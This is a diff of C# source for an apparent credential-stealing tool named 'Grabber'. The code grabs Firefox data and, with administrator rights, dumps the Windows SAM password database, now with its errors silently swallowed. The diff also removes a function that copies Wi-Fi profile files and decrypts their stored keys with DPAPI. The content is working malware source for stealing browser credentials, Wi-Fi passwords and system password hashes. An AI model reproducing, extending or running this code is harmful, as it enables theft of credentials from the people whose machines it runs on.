@@ -61,21 +61,22 @@ namespace Grabber
             catch { Console.WriteLine("Firefox failed"); }
             #endregion
 
-            #region WiFi
-            //grabWifiPasswords(cd);
-            #endregion
-
-
-            //if running as admin
-            //do admin stuff
+            #region Admin Stuff
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             if (principal.IsInRole(WindowsBuiltInRole.Administrator))
             {
-                dumpSAM(cd, home);
+                #region SAM
+                try
+                {
+                    dumpSAM(cd, home);
+                }
+
+                catch { }
+                #endregion
             }
 
-            else Console.WriteLine("Not admin");
+            #endregion
         }
 
 
@@ -226,57 +227,6 @@ namespace Grabber
             }
 
             else return false;
-        }
-
-        static void grabWifiPasswords(string cd)
-        {
-            string WiFiDirectory = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%") + @"\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\";
-            string outPutDirectory = cd + "\\WiFi\\";
-            Directory.CreateDirectory(outPutDirectory);
-
-            foreach (string dir in Directory.GetDirectories(WiFiDirectory))
-            {
-                foreach (string file in Directory.GetFiles(dir))
-                {
-                    string[] comps = file.Split('\\');
-                    string outFile = outPutDirectory + comps[comps.Length - 1];
-                    File.Copy(file, outFile, true);
-                    XmlDocument doc = new XmlDocument();
-                    doc.Load(outFile);
-
-                    XmlNode protectedNode = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["protected"];
-                    protectedNode.InnerText = "false";
-
-                    XmlNode password = doc["WLANProfile"]["MSM"]["security"]["sharedKey"]["keyMaterial"];
-                    byte[] encryptedBytes = stringToByteArray(password.InnerText);
-                    byte[] decryptedBytes = new byte[0];
-                    try
-                    {
-                        decryptedBytes = DPAPI.decryptBytes(encryptedBytes);
-                    }
-
-                    catch
-                    {
-                        Console.WriteLine("WiFi decryption failed");
-                    }
-                    password.InnerText = decryptedBytes.ToString();
-                    Console.WriteLine(decryptedBytes.ToString());
-                    doc.Save(outFile);
-                }
-            }
-        }
-
-        static byte[] stringToByteArray(String hex)
-        {
-            int numCharacters = hex.Length / 2;
-            byte[] bytes = new byte[numCharacters];
-            using (var sr = new StringReader(hex))
-            {
-                for (int i = 0; i < numCharacters; i++)
-                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
-            }
-
-            return bytes;
         }
 
         static void dumpSAM(string cd, string home)
